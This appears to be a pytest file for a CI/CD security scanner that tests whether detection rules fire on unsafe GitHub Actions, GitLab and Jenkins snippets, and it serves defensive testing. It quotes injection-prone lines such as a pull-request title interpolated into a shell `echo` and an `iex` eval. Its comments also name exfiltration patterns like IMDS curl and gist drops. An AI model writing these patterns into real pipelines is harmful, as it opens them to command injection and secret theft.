            rationale="GitLab-specific: remote include resolves the URL at pipeline-parse time; no integrity verification.",
            spec_ref="GitLab CI docs — include: remote; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-GL-001"}),
            platform=Platform.GITLAB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — Jenkins shared library without SHA pin. Loading
    # `@Library('my-lib') _` at the top of a Jenkinsfile resolves the
    # library's default branch; whoever pushes to that branch controls
    # everything that runs after.
    # -------------------------------------------------------------------------
    "jenkins_shared_library_no_sha": [
        Sample(
            source="@Library('my-shared-lib') _",
            rationale="Jenkins-specific: Shared library loaded by name only; branch default applies on every build.",
            spec_ref="Jenkins docs — shared libraries / modernSCM; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-JK-001"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — Groovy @Grab without an explicit version pulls the
    # newest artifact Maven Central publishes, making the build dependent
    # on upstream-maintainer choices that can change without notice.
    # -------------------------------------------------------------------------
    "jenkins_grab_no_version": [
        Sample(
            source="@Grab('org.apache.commons:commons-lang3')",
            rationale="Jenkins-specific: @Grab with only group:artifact resolves latest; no version pin = supply-chain risk.",
            spec_ref="Groovy @Grab docs; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-JK-002"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — docker.image().inside() called with :latest or an
    # untagged image. Same mutability argument as the GitHub docker:// form.
    # -------------------------------------------------------------------------
    "jenkins_docker_image_mutable_tag": [
        Sample(
            source="docker.image('ubuntu:latest').inside { sh 'make test' }",
            rationale="Jenkins-specific: docker.image(':latest') resolves the mutable tag at build time.",
            spec_ref="Docker Hub — tag mutability; Jenkins Docker Pipeline docs; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-JK-003"}),
            platform=Platform.JENKINS,
        ),
    ],
}


# =============================================================================
# Retraction log — samples intentionally NOT in the oracle
#
# Institutional memory in test form. Each entry was once proposed (or
# originally shipped) and was retracted because the semantic claim did
# not hold unconditionally. A test asserts none of these reappear in
# SAFE_BY_CONSTRUCTION — if someone adds one back, the test fails with
# a pointer to the FINDINGS.md entry explaining why.
# =============================================================================

RETRACTED_SAMPLES: dict[str, str] = {
    "      - run: echo '${{ github.event.pull_request.title }}'": (
        "F-3a: GitHub Actions substitutes ${{ }} at workflow-parse time, "
        "before shell quoting applies. Attacker-embedded ' escapes the quotes."
    ),
    "      # never do: sh \"deploy ${params.BRANCH}\"": (
        "F-3b: cross-platform comment-style confusion, not an oracle-relevant "
        "safety claim. Platform routing in engine.scan_file handles it."
    ),
    '      - run: deploy.sh "$CI_COMMIT_BRANCH"': (
        "F-3c: safety of deploy.sh depends on what deploy.sh does with the "
        "argument, not on bash quoting. The echo/printf category asserts the "
        "consumer doesn't re-parse — deploy.sh offers no such guarantee."
    ),
    "      - run: pwsh -c 'iex \"$($MyVariable)\"'": (
        "F-3d: `iex \"$(...)\"` is eval on a subexpression, not a local-file "
        "read. Moved to UNSAFE/iex_on_interpolated_string."
    ),
}


# =============================================================================
# Harness
# =============================================================================


def _flatten(
    table: dict[str, list[Sample]],
) -> list[tuple[str, int, Sample]]:
    """Turn {category: [Sample, ...]} into [(category, index, sample), ...].

    The index is the sample's 0-based position inside its category, used to
    build a short and collision-free pytest test-id. The earlier harness
    truncated the raw source at 40 chars, which produced duplicate IDs for
    samples sharing a prefix and let pytest silently suffix them with 0/1/2.
    """
    out: list[tuple[str, int, Sample]] = []
    for category, samples in table.items():
        for index, s in enumerate(samples):
            out.append((category, index, s))
    return out


# `loaded_rules` (session-scoped fixture) and `_is_file_scope_absence_rule`
# live in tests/integration/conftest.py so they can be shared across all
# integration test files. See conftest.py for their definitions.


def _rules_that_fire(
    rules: list[Rule],
    source: str,
    platform: Platform | None = None,
) -> tuple[list[str], list[tuple[str, BaseException]]]:
    """Return (fired_rule_ids, crashed_rules).

    Separating "rule over-matched" from "rule crashed" is deliberate: they
    are different bugs with different fixes. An over-match is a precision
    issue in the rule's pattern; a crash is a scanner-robustness issue
    regardless of which sample triggered it. Collapsing them into a single
    list (as the previous harness did) produced misleading failure
    messages of the form "rule X fired" when the real story was "rule X
    raised ValueError."

    When `platform` is provided, the rule list is filtered to that
    platform first. See docs/oracle/EXTENSIONS.md §EXT-A.
    """
    if platform is not None:
        rules = [r for r in rules if r.platform == platform]
    lines = source.splitlines()
    fired: list[str] = []
    crashed: list[tuple[str, BaseException]] = []
    for rule in rules:
        try:
            matches = rule.pattern.check(source, lines)
        except Exception as e:
            crashed.append((rule.id, e))
            continue
        if matches:
            fired.append(rule.id)
    return sorted(set(fired)), crashed


# =============================================================================
# Tests
# =============================================================================


# ---------------------------------------------------------------------------
# Known rule-precision / recall gaps are now tracked on the Sample itself
# via its `xfail_reason` field, so the linkage survives source reformatting.
# See docs/oracle/FINDINGS.md for the catalogue of open gaps.
# ---------------------------------------------------------------------------


def _params(table: dict[str, list[Sample]]):
    """Build pytest.param entries with informative test IDs.

    The ID format is `{rule_label}-{category}-{index}` for UNSAFE samples
    and `{category}-{index}` for SAFE samples. Including the expected
    rule IDs in the UNSAFE id makes failures directly self-locating in
    pytest output — you see which rule the sample was exercising without
    cross-referencing the grammar.
    """
    for category, index, sample in _flatten(table):
        marks = []
        if sample.xfail_reason:
            marks.append(pytest.mark.xfail(strict=True, reason=sample.xfail_reason))
        if sample.expected_rules:
            rule_label = "+".join(sorted(sample.expected_rules))
            test_id = f"{rule_label}-{category}-{index}"
        else:
            test_id = f"{category}-{index}"
        yield pytest.param(category, sample, marks=marks, id=test_id)


@pytest.mark.parametrize(
    ("category", "sample"),
    list(_params(SAFE_BY_CONSTRUCTION)),
)
def test_no_rule_fires_on_safe_sample(
    category: str, sample: Sample, loaded_rules: list[Rule]
) -> None:
    """No rule may fire on a sample whose safety is established by
    language semantics. A rule crash is treated as a separate failure
    from an over-match — see _rules_that_fire for rationale. See
    docs/oracle/DESIGN.md §CR-5 for the resolution protocol on FPs.
    """
    fired, crashed = _rules_that_fire(loaded_rules, sample.source, sample.platform)
    assert not crashed, (
        f"Rule(s) crashed on safe sample — scanner-robustness bug.\n"
        f"  Category:  {category}\n"
        f"  Sample:    {sample.source!r}\n"
        f"  Rationale: {sample.rationale} ({sample.spec_ref})\n"
        f"  Crashes:   {[(rid, f'{type(e).__name__}: {e}') for rid, e in crashed]}"
    )
    assert not fired, (
        f"False positive on provably-safe sample.\n"
        f"  Category:         {category}\n"
        f"  Sample:           {sample.source!r}\n"
        f"  Rules that fired: {fired}\n"
        f"  Rationale:        {sample.rationale}\n"
        f"  Spec reference:   {sample.spec_ref}\n"
        f"  See docs/oracle/DESIGN.md §CR-5 for the resolution protocol."
    )


@pytest.mark.parametrize(
    ("category", "sample"),
    list(_params(UNSAFE_BY_CONSTRUCTION)),
)
def test_expected_rule_fires_on_unsafe_sample(
    category: str, sample: Sample, loaded_rules: list[Rule]
) -> None:
    """At least one rule — ideally one the sample author expected — must
    fire on a sample that is dangerous by construction.

    When `sample.expected_rules` is non-empty, the oracle asserts the
    intersection with actually-fired rules is non-empty. That catches
    silent regressions where the originally-testing rule was narrowed
    and some unrelated rule coincidentally covers for it — invisible to
    the old "any rule fires" assertion. See the audit feedback on PR
    #39 (big improvement #2) for the rationale.

    When `expected_rules` is empty, the legacy "at least one rule fires"
    check is used. New samples SHOULD populate `expected_rules`.
    """
    fired, crashed = _rules_that_fire(loaded_rules, sample.source, sample.platform)
    assert not crashed, (
        f"Rule(s) crashed on unsafe sample — scanner-robustness bug.\n"
        f"  Category:  {category}\n"
        f"  Sample:    {sample.source!r}\n"
        f"  Crashes:   {[(rid, f'{type(e).__name__}: {e}') for rid, e in crashed]}"
    )
    assert fired, (
        f"False negative on provably-unsafe sample.\n"
        f"  Category:       {category}\n"
        f"  Sample:         {sample.source!r}\n"
        f"  Rationale:      {sample.rationale}\n"
        f"  Spec reference: {sample.spec_ref}\n"
        f"  Expected rules: {sorted(sample.expected_rules) or '(any)'}\n"
        f"  No rule fired. Either the expected rule's pattern is too\n"
        f"  narrow, or this sample shape is outside the rule set's\n"
        f"  remit. See docs/oracle/DESIGN.md §CR-6 for resolution."
    )
    if sample.expected_rules:
        overlap = sample.expected_rules & set(fired)
        assert overlap, (
            f"Expected-rule mismatch: a rule fired, but not one the\n"
            f"sample author designated. This usually means the author's\n"
            f"intended rule was narrowed and something else is covering\n"
            f"for it — a silent regression the old harness missed.\n"
            f"  Category:       {category}\n"
            f"  Sample:         {sample.source!r}\n"
            f"  Expected rules: {sorted(sample.expected_rules)}\n"
            f"  Fired rules:    {fired}\n"
            f"  If the replacement rule is the correct long-term home,\n"
            f"  update the sample's expected_rules; otherwise fix the\n"
            f"  regressed rule."
        )


# =============================================================================
# Meta-tests — the grammar itself has a contract to uphold
# =============================================================================


def _read_doc(name: str) -> str:
    """Resolve docs relative to the taintly package, not this file's
    position in the tree. Counting `.parent` calls broke when the test
    was re-homed under a different directory layout.
    """
    return (_DOCS_DIR / name).read_text()


def test_every_sample_category_is_documented() -> None:
    """Every key in both grammars MUST appear as a row in DESIGN.md's
    category table. We parse the tables explicitly rather than doing a
    substring search so a key wrapped in smart quotes or a code fence
    doesn't produce a false negative.
    """
    import re

    design_doc = _read_doc("DESIGN.md")

    # Tables use Markdown pipe rows whose first column is `\`key\``.
    documented: set[str] = set()
    for match in re.finditer(r"^\|\s*`([A-Za-z0-9_]+)`\s*\|", design_doc, re.MULTILINE):
        documented.add(match.group(1))

    all_keys = set(SAFE_BY_CONSTRUCTION) | set(UNSAFE_BY_CONSTRUCTION)
    undocumented = sorted(all_keys - documented)
    assert not undocumented, (
        f"Grammar categories missing from docs/oracle/DESIGN.md: {undocumented}\n"
        f"Add a row to the SAFE or UNSAFE categories table."
    )


def _required_categories_from_requirements() -> set[str]:
    """Parse the bullet list under §FR-3 so the test doesn't silently
    diverge from the doc. Entries look like:

        ### FR-3 — Category coverage
        ...
        - Single-quoted-vs-double-quoted shell variable interpolation
        - Groovy GString interpolation (single / double / triple-double quotes)
        ...

    We translate the human-readable bullets to grammar keys via a small
    table that lives in one place.
    """
    import re

    doc = _read_doc("REQUIREMENTS.md")
    # Slice from "### FR-3" to the next "###" header.
    fr3 = re.search(r"### FR-3.*?(?=^### )", doc, re.MULTILINE | re.DOTALL)
    assert fr3, "REQUIREMENTS.md must contain an ### FR-3 section"
    bullets = re.findall(r"^- (.+)$", fr3.group(0), re.MULTILINE)

    # Canonical mapping: FR-3 bullet prefix -> grammar key.
    bullet_to_key = {
        "Single-quoted-vs-double-quoted shell variable": {
            "single_quoted_shell_var",
            "double_quoted_shell_var_passed_to_echo",
        },
        "Groovy GString interpolation": {
            "groovy_single_quoted",
            "double_quoted_gstring_with_param",
        },
        "YAML comment lines": {"yaml_comment_lines"},
        "Heredoc quoting semantics": {"heredoc_quoted_marker"},
        "Literal strings with no variables": {"static_string_literal"},
        "PowerShell `iex`": {"powershell_iex_local_file"},
        "Unquoted shell variables": {"unquoted_shell_var_in_sh"},
        "Curl-pipe-bash": {"curl_pipe_bash"},
        "`eval` on user input": {"eval_on_dynamic_input"},
    }

    required: set[str] = set()
    for bullet in bullets:
        for prefix, keys in bullet_to_key.items():
            if bullet.startswith(prefix):
                required.update(keys)
                break
        else:
            raise AssertionError(
                f"REQUIREMENTS.md §FR-3 bullet is not mapped to any grammar "
                f"key — update bullet_to_key in test_grammar_oracle.py: {bullet!r}"
            )
    return required


def test_grammar_has_minimum_category_coverage() -> None:
    """REQUIREMENTS.md §FR-3 lists categories the grammar must cover.
    The expected set is parsed from the doc rather than hard-coded so
    the test can't silently drift from the requirements.
    """
    required = _required_categories_from_requirements()
    present = set(SAFE_BY_CONSTRUCTION) | set(UNSAFE_BY_CONSTRUCTION) | set(RETRACTED_SAMPLES.values())
    # Retracted keys aren't stored as grammar keys, but their reason text
    # cites the original key; we only care that grammar categories cover
    # the FR-3 list.
    grammar_keys = set(SAFE_BY_CONSTRUCTION) | set(UNSAFE_BY_CONSTRUCTION)
    missing = required - grammar_keys
    assert not missing, (
        f"REQUIREMENTS.md §FR-3 categories missing from grammar: {sorted(missing)}"
    )
    del present  # only the grammar categories gate this test


def test_retracted_samples_do_not_reappear() -> None:
    """Institutional memory: samples that were once retracted must not
    silently come back into SAFE_BY_CONSTRUCTION. If one does, fail
    with a pointer to the findings-log entry explaining why it left.
    """
    safe_sources = {s.source for samples in SAFE_BY_CONSTRUCTION.values() for s in samples}
    resurrected = [src for src in RETRACTED_SAMPLES if src in safe_sources]
    if resurrected:
        messages = "\n".join(f"  - {src!r}\n      {RETRACTED_SAMPLES[src]}" for src in resurrected)
        raise AssertionError(
            "Retracted samples reappeared in SAFE_BY_CONSTRUCTION:\n" + messages
        )


_SPEC_REF_MARKERS = ("§", "spec", "manual", "RFC", "POSIX", "OWASP", "docs", "principles")

# Platform-citation markers required in the rationale of any sample whose
# `platform` field is set. See docs/oracle/EXTENSIONS.md §EXT-A FR-A4.
_PLATFORM_MARKERS: dict[Platform, tuple[str, ...]] = {
    Platform.GITHUB: ("GitHub Actions", "GitHub"),
    Platform.GITLAB: ("GitLab",),
    Platform.JENKINS: ("Jenkins",),
}

# Syntactic markers that indicate a sample is tied to one platform. The
# consistency test (FR-A3) asserts any sample containing a marker is
# scoped to the corresponding platform — catching the regression where a
# new platform-specific sample is added without setting `platform`.
_PLATFORM_SYNTACTIC_MARKERS: dict[Platform, tuple[str, ...]] = {
    Platform.GITHUB: ("${{ github.", "pwsh -c"),
    Platform.JENKINS: ('sh "', "sh '", 'sh """'),
}


def test_every_sample_has_well_formed_metadata() -> None:
    """Lint: every Sample's rationale and spec_ref must be non-empty, and
    the spec_ref must contain at least one recognisable citation marker.
    Catches the slow-drift failure where someone adds a sample with a
    vague "should be safe" justification.
    """
    bad: list[str] = []
    for bucket_name, bucket in (
        ("SAFE", SAFE_BY_CONSTRUCTION),
        ("UNSAFE", UNSAFE_BY_CONSTRUCTION),
    ):
        for category, samples in bucket.items():
            for index, s in enumerate(samples):
                loc = f"{bucket_name}/{category}[{index}]"
                if not s.rationale.strip():
                    bad.append(f"{loc}: empty rationale")
                if not s.spec_ref.strip():
                    bad.append(f"{loc}: empty spec_ref")
                elif not any(m.lower() in s.spec_ref.lower() for m in _SPEC_REF_MARKERS):
                    bad.append(
                        f"{loc}: spec_ref {s.spec_ref!r} lacks a citation "
                        f"marker (expected one of {_SPEC_REF_MARKERS})"
                    )
                if s.platform is not None:
                    markers = _PLATFORM_MARKERS.get(s.platform, ())
                    if not any(m in s.rationale for m in markers):
                        bad.append(
                            f"{loc}: platform={s.platform.name} requires a "
                            f"platform-citation marker in rationale "
                            f"(expected one of {markers}); see EXTENSIONS.md "
                            f"§EXT-A FR-A4"
                        )
    assert not bad, "Sample metadata lint failed:\n  " + "\n  ".join(bad)


def test_platform_scoping_is_consistent() -> None:
    """FR-A3 (EXTENSIONS.md §EXT-A): any sample whose source contains a
    platform-specific syntactic marker (e.g. `${{ github.` or `sh "`)
    MUST have a matching `platform` field. Catches the regression where
    a new platform-specific sample is added without scoping.
    """
    bad: list[str] = []
    for bucket_name, bucket in (
        ("SAFE", SAFE_BY_CONSTRUCTION),
        ("UNSAFE", UNSAFE_BY_CONSTRUCTION),
    ):
        for category, samples in bucket.items():
            for index, s in enumerate(samples):
                for platform, markers in _PLATFORM_SYNTACTIC_MARKERS.items():
                    if any(m in s.source for m in markers):
                        if s.platform != platform:
                            bad.append(
                                f"{bucket_name}/{category}[{index}] contains "
                                f"a {platform.name}-specific marker but has "
                                f"platform={s.platform!r}; should be "
                                f"platform=Platform.{platform.name}"
                            )
                        break
    assert not bad, "Platform-scoping consistency lint failed:\n  " + "\n  ".join(bad)


# =============================================================================
# EXT-B — Inverse rule-attribution index
#
# See docs/oracle/EXTENSIONS.md §EXT-B for the RFC. The principle: every
# RegexPattern rule must have at least one UNSAFE sample that fires on it,
# OR be listed in the per-family gap allowlist below as an acknowledged
# follow-up. Other pattern types (Context/Sequence/Block/Path/Taint) are
# structurally exempt because the oracle's single-fragment samples can't
# exercise multi-line context.
# =============================================================================

# Pattern types that can be exercised by a single-fragment sample. New
# pattern types default to "not grammar-testable" until evaluated and
# explicitly added here — that's the safe direction (no silent
# re-exemption when the pattern landscape changes).
_GRAMMAR_TESTABLE_PATTERN_TYPES: tuple[type, ...] = (RegexPattern,)


# Coverage gaps grouped by family. Each family is a unit of follow-up
# work — a future PR picks a family, writes samples for its members,
# and removes the entries here. See docs/oracle/GAPS.md for the
# per-family action notes.
_REGEX_GAPS_BY_FAMILY: dict[str, frozenset[str]] = {
    # SEC2 — closed via workflow_write_all_permissions (SEC2-GH-001),
    # pipeline_credential_in_yaml (SEC2-GL-001, SEC2-JK-001), and
    # jenkins_credential_id_from_params (SEC2-JK-002).
    "SEC2 — identity / secrets in workflow text": frozenset({
        # SEC2-GL-003 / SEC2-JK-003 — hardcoded service credentials.
        # Target-shape is a *_PASSWORD / docker login -p / docker run -e
        # *_PASSWORD= pattern with a literal value; the grammar corpus
        # doesn't yet carry a "literal credential next to a service name"
        # sample.  Both rules are exercised by their own self-test
        # positives + real-world scans on fjudith-docker-wordpress
        # (JK) and 6+ public GL repos (cbbrowne/pgcmp, netlight/testing-
        # workshop, LinOTP/LinOTP, xantocoder/gitaly, neondatabase/
        # postgresql_anonymizer, dattatrayr/run-dotnet-tests-...).
        "SEC2-GL-003",
        "SEC2-JK-003",
    }),
    # SEC3 (supply-chain pinning) — closed; see new grammar categories
    # github_unpinned_action_ref, github_docker_action_no_digest,
    # pip_dependency_confusion_extra_index, gitlab_remote_include_no_integrity,
    # jenkins_shared_library_no_sha, jenkins_grab_no_version,
    # jenkins_docker_image_mutable_tag.
    "SEC4 — poisoned-pipeline-execution patterns not yet exercised": frozenset({
        "SEC4-GH-002", "SEC4-GH-007", "SEC4-GH-008",
        "SEC4-GH-009", "SEC4-GH-010", "SEC4-GH-012",
        "SEC4-GL-004",
        # SEC4-GL-007 / SEC4-JK-007 — spoofable-actor gate ports of
        # SEC4-GH-010.  Same rationale: the grammar corpus keys on
        # `github.actor` syntactically, so the platform analogs
        # (`$GITLAB_USER_LOGIN`, `env.CHANGE_AUTHOR`) fall outside
        # its coverage until a dedicated sample lands.
        "SEC4-GL-007", "SEC4-JK-007",
        "SEC4-JK-003", "SEC4-JK-005",
    }),
    "SEC5 — pipeline-based access-control patterns": frozenset({
        # SEC5-GH-002 — toJSON(secrets) full-secrets dump.  Expression-
        # level idiom, not a YAML-structure code-shape the grammar
        # corpus exercises.  Known gap until a secrets-dump sample
        # lands in the oracle.
        "SEC5-GH-002",
    }),
    "SEC6 — credential hygiene (hardcoded secrets, weak refs)": frozenset({
        "SEC6-GH-001", "SEC6-GH-003", "SEC6-GH-004", "SEC6-GH-005",
        "SEC6-GH-006",
        # SEC6-GH-008 — exfil-shaped primitives (gh gist create, IMDS
        # curl, runner-registration-token POST).  IOC-shaped rather
        # than code-shape; grammar corpus doesn't yet have a prt-scan
        # fixture.  Tracked as known gap.
        "SEC6-GH-008",
        "SEC6-GL-001", "SEC6-GL-003", "SEC6-GL-004", "SEC6-GL-005",
        "SEC6-GL-007", "SEC6-GL-008",
        # SEC6-GL-009 — GitLab port of SEC6-GH-008 (glab snippet create,
        # glab api POST to /issues / /notes / /snippets / /runners, IMDS
        # curl).  Same IOC-shaped class; inherits the known-gap rationale.
        "SEC6-GL-009",
        "SEC6-JK-001", "SEC6-JK-004", "SEC6-JK-005", "SEC6-JK-006",
        "SEC6-JK-007",
        # SEC6-JK-008 — Jenkins port of SEC6-GH-008 (IMDS curl, gh gist /
        # glab snippet drop, runner-registration-token POST).  Same
        # IOC-shaped class; same rationale.
        "SEC6-JK-008",
    }),
    "SEC7 — runner / job hardening text patterns": frozenset({
        "SEC7-GH-001", "SEC7-GH-002",
        "SEC7-GL-001",
        "SEC7-JK-001", "SEC7-JK-002", "SEC7-JK-003",
    }),
    "SEC8 — third-party service text patterns (image:latest etc.)": frozenset({
        "SEC8-GH-002", "SEC8-GH-003",
        "SEC8-JK-001", "SEC8-JK-002", "SEC8-JK-003",
        # SEC8-JK-004 — Jenkins port of SEC8-GH-004 (--privileged agent
        # / container).  Multi-form regex (declarative args '--privileged',
        # scripted .inside/.withRun, shell-level docker run) is a Jenkins
        # syntactic shape without a generic single-fragment grammar
        # sample; tracked as a known gap.
        "SEC8-JK-004",
    }),
    # SEC9 — Jenkins artifact integrity text patterns (closed: SEC9-JK-001
    # is exercised by llm_output_piped_to_shell's Jenkins sample, which is
    # structurally `sh '... curl ... | bash'`).
    "SEC9 — Jenkins artifact integrity text patterns": frozenset(),
    "SEC10 — logging / visibility config patterns": frozenset({
        "SEC10-GH-003", "SEC10-GL-001",
    }),
    # AI / ML rules detect domain-specific risks (remote-code model loading,
    # unpinned HuggingFace refs, LLM prompt-injection surfaces). Rules whose
    # attack shape is a single-fragment RegexPattern are exercised by
    # grammar samples (see ml_deserialization_unsafe); the rules listed
    # below remain exempt for structural reasons — their patterns are
    # ContextPattern / SequencePattern / PathPattern and need multi-line
    # context that single-fragment samples cannot express. Those rules
    # are exercised by the per-platform vulnerable fixtures and the
    # rule's own test_positive list.
    "AI — ML / LLM-specific risk patterns": frozenset({
        "AI-GH-002",
        "AI-GH-004",
        "AI-GH-005",
        "AI-GH-006",
        "AI-GH-007",
        "AI-GH-008",
        "AI-GH-009",
        "AI-GH-011",
        "AI-GH-012",
        "AI-GH-013",
        "AI-GH-014",
        # AI-GH-015 / AI-GH-017 are ContextPattern, not RegexPattern —
        # not subject to this check in the first place.  AI-GH-016 is
        # RegexPattern but its signal is a *_BASE_URL env override,
        # not a code-shape the grammar corpus exercises; add to the
        # known-gap list until a provider-endpoint-override sample
        # lands in the grammar oracle.
        "AI-GH-016",
        # AI-GH-025 same family as AI-GH-016: env-line resolver-redirect
        # signal (HF_ENDPOINT / HF_HOME / TRANSFORMERS_CACHE assigned
        # from inputs/vars/github.event or cleartext http://). The
        # grammar corpus does not yet model HF resolver env-line
        # assignments; add when an HF-resolver sample lands.
        "AI-GH-025",
        # AI-GH-018 was originally RegexPattern but got refactored to
        # ContextPattern during corpus validation — it's now outside
        # this check's scope.  (Generic flags like `-p` / `--prompt`
        # matched docker/node/jq in unrelated run: lines as FPs, so
        # the final form requires agent-unique flags + file-level
        # tool-name corroboration via ContextPattern.requires.)
        "AI-GL-004",
        "AI-GL-006",
        "AI-GL-007",
        "AI-GL-008",
        # AI-GL-011 / AI-JK-007 — GitLab and Jenkins ports of AI-GH-016.
        # Same *_BASE_URL env-override signal; inherits the known-gap
        # rationale until a provider-endpoint-override sample lands in
        # the grammar oracle.
        "AI-GL-011",
        "AI-JK-007",
        # AI-GL-014 / AI-JK-010 — GitLab and Jenkins ports of AI-GH-022.
        # Agent-bypass-flag signal (--dangerously-skip-permissions etc.)
        # is shell/script-line lexical; the grammar oracle's corpus
        # focuses on YAML structural shapes, not in-line CLI flags.
        # Inherits AI-GH-022's known-gap rationale (kept off the list
        # there because the GH form is ContextPattern; the GL/JK forms
        # are RegexPattern and so come into scope here).
        "AI-GL-014",
        "AI-JK-010",
        # AI-GL-016 / AI-JK-012 — GitLab and Jenkins ports of AI-GH-025.
        # HF resolver env-line signal; same family as AI-GH-025 in the
        # known-gap list above (env-line resolver redirect, not a
        # code-shape the grammar corpus exercises).
        "AI-GL-016",
        "AI-JK-012",
        # AI-GH-027 — checkpoint upload to mutable tag / Production
        # stage. Signal is a Python API call shape (push_to_hub /
        # mlflow.register_model / wandb log_artifact / s3 cp) inside
        # a run: line; the YAML grammar corpus models triggers and
        # action shapes, not embedded Python API calls.
        "AI-GH-027",
        # AI-GH-028 — ML tracking-URI rebound from inputs/vars/event.
        # Same env-line rebinding family as AI-GH-025 / AI-GL-016 /
        # AI-JK-012 above.
        "AI-GH-028",
        # AI-GH-029 — LoRA / PEFT adapter merge from unpinned source.
        # Same Python-API-shape-in-a-run-line family as AI-GH-027.
        "AI-GH-029",
        # AI-GH-031 / 032 / 033 / 034 — multi-agent orchestration
        # rules. Signal is a Python API call shape (UserProxyAgent /
        # add_conditional_edges / MemorySaver / AgentTool) inside a
        # run: line, same family as AI-GH-027 / AI-GH-029.
        "AI-GH-031",
        "AI-GH-032",
        "AI-GH-033",
        "AI-GH-034",
    }),
}

_REGEX_RULES_WITH_KNOWN_GAP: dict[str, str] = {
    rid: family
    for family, ids in _REGEX_GAPS_BY_FAMILY.items()
    for rid in ids
}


def _build_coverage_index(rules: list[Rule]) -> dict[str, list[str]]:
    """Return {rule_id: [test_id of UNSAFE sample(s) that fired on it]}.

    Walks every UNSAFE sample, runs the platform-scoped rule subset
    against it, and accumulates which rules fired. The same machinery
    `test_expected_rule_fires_on_unsafe_sample` uses, surfaced as a
    standalone index so a meta-test can ask "which rules has the
    grammar exercised at least once."
    """
    index: dict[str, list[str]] = {}
    for category, samples in UNSAFE_BY_CONSTRUCTION.items():
        for idx, sample in enumerate(samples):
            test_id = f"{category}-{idx}"
            fired, _crashed = _rules_that_fire(rules, sample.source, sample.platform)
            for rid in fired:
                index.setdefault(rid, []).append(test_id)
    return index


def test_every_grammar_testable_rule_has_coverage_or_known_gap(
    loaded_rules: list[Rule],
) -> None:
    """FR-B1+B2 (EXTENSIONS.md §EXT-B): every RegexPattern rule must
    have at least one UNSAFE sample firing on it, OR be listed in
    _REGEX_RULES_WITH_KNOWN_GAP as an acknowledged follow-up.

    Catches the silent-narrowing class of bugs the audit flagged: a
    rule that gets accidentally tightened to match nothing produces
    no test failure under the per-sample tests, but DOES surface here
    because its rule_id stops appearing in the coverage index.
    """
    coverage = _build_coverage_index(loaded_rules)
    uncovered_unexempted = sorted(
        r.id for r in loaded_rules
        if isinstance(r.pattern, _GRAMMAR_TESTABLE_PATTERN_TYPES)
        and r.id not in coverage
        and r.id not in _REGEX_RULES_WITH_KNOWN_GAP
    )
    assert not uncovered_unexempted, (
        f"RegexPattern rules without grammar coverage and not in "
        f"_REGEX_GAPS_BY_FAMILY: {uncovered_unexempted}\n"
        f"Either:\n"
        f"  (a) add an UNSAFE sample to test_grammar_oracle.py whose\n"
        f"      expected_rules includes the rule ID, OR\n"
        f"  (b) add the rule to _REGEX_GAPS_BY_FAMILY with a one-line\n"
        f"      family characterisation citing why it's non-trivial.\n"
        f"See docs/oracle/EXTENSIONS.md §EXT-B and docs/oracle/GAPS.md."
    )


_COVERAGE_ARTIFACT_PATH = (
    Path(__file__).resolve().parent / "oracle-coverage.json"
)


def _coverage_artifact_payload(loaded_rules: list[Rule]) -> dict[str, object]:
    """Build the JSON payload for the coverage artifact.

    Two top-level keys:

    - `rule_coverage`: {rule_id: sorted [sample_id]} for every rule
      that fired on at least one UNSAFE sample. Sample IDs use the
      `{category}-{index}` convention.
    - `uncovered_grammar_testable_rules`: sorted list of RegexPattern
      rule IDs with zero grammar coverage (mirrors EXT-B's allowlist
      but as data; lets the artifact stand on its own without
      cross-referencing source code).

    Determinism: every container is sorted before serialisation so
    diffs are review-friendly and CI runs are byte-stable.
    """
    coverage = _build_coverage_index(loaded_rules)
    return {
        "rule_coverage": {
            rid: sorted(set(samples)) for rid, samples in sorted(coverage.items())
        },
        "uncovered_grammar_testable_rules": sorted(
            r.id for r in loaded_rules
            if isinstance(r.pattern, _GRAMMAR_TESTABLE_PATTERN_TYPES)
            and r.id not in coverage
        ),
    }


def test_coverage_artifact_is_up_to_date(loaded_rules: list[Rule]) -> None:
    """EXT-E (audit Medium #8): the on-disk oracle-coverage.json must
    match the just-computed coverage map.

    Snapshot pattern. A PR that narrows a rule shows up as a diff in
    the artifact ("rule X no longer fires on sample Y"), making the
    drift visible at review time rather than silently passing because
    something else still fires.

    Local update flow:

        ORACLE_UPDATE_COVERAGE=1 pytest tests/integration/test_grammar_oracle.py::test_coverage_artifact_is_up_to_date

    With the env var set, the test rewrites the artifact and passes.
    Without the env var, a mismatch fails with the diff.
    """
    import json
    import os

    payload = _coverage_artifact_payload(loaded_rules)
    serialised = json.dumps(payload, indent=2, sort_keys=True) + "\n"

    if os.environ.get("ORACLE_UPDATE_COVERAGE") == "1":
        _COVERAGE_ARTIFACT_PATH.write_text(serialised)
        return

    if not _COVERAGE_ARTIFACT_PATH.exists():
        raise AssertionError(
            f"Coverage artifact missing at {_COVERAGE_ARTIFACT_PATH}.\n"
            f"Run with ORACLE_UPDATE_COVERAGE=1 to generate it."
        )

    on_disk = _COVERAGE_ARTIFACT_PATH.read_text()
    if on_disk != serialised:
        import difflib

        diff = "".join(
            difflib.unified_diff(
                on_disk.splitlines(keepends=True),
                serialised.splitlines(keepends=True),
                fromfile="oracle-coverage.json (committed)",
                tofile="oracle-coverage.json (current run)",
                n=3,
            )
        )
        raise AssertionError(
            f"Oracle coverage artifact is out of date.\n"
            f"  Path: {_COVERAGE_ARTIFACT_PATH}\n"
            f"  Re-run with ORACLE_UPDATE_COVERAGE=1 to regenerate, or\n"
            f"  inspect the diff to see which rule-sample relationships\n"
            f"  changed:\n\n"
            f"{diff}"
        )


def test_known_gaps_are_actual_rules_and_still_uncovered(
    loaded_rules: list[Rule],
) -> None:
    """FR-B4 (EXTENSIONS.md §EXT-B): the gap allowlist must not rot.
    Every entry's rule must (a) still exist after renames, and (b)
    still actually be uncovered — entries that DID get a sample must
    be removed in the same PR that ships the sample.
    """
    rule_ids = {r.id for r in loaded_rules}
    coverage = _build_coverage_index(loaded_rules)

    stale_renamed = sorted(rid for rid in _REGEX_RULES_WITH_KNOWN_GAP if rid not in rule_ids)
